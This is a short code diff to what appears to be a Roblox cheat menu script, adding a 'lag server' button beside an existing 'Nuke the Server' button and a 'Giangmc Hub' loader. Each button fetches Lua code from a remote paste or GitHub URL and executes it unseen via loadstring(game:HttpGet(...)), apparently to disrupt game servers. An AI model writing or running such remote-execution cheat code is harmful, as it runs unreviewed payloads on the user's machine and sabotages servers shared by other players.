@@ -32,6 +32,10 @@ KillingCheats:CreateButton("Giangmc Hub", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Giangplay/Slap_Battles/main/Slap_Battles.lua"))()
 end)
 
+KillingCheats:CreateButton("lag server", function()
+loadstring(game:HttpGet("https://pastefy.app/DywJzMV6/raw", true))();
+end)
+
 KillingCheats:CreateButton("Nuke the Server", function()
 loadstring(game:HttpGet("https://pastefy.app/J0u9Qe7p/raw",true))();
 end)
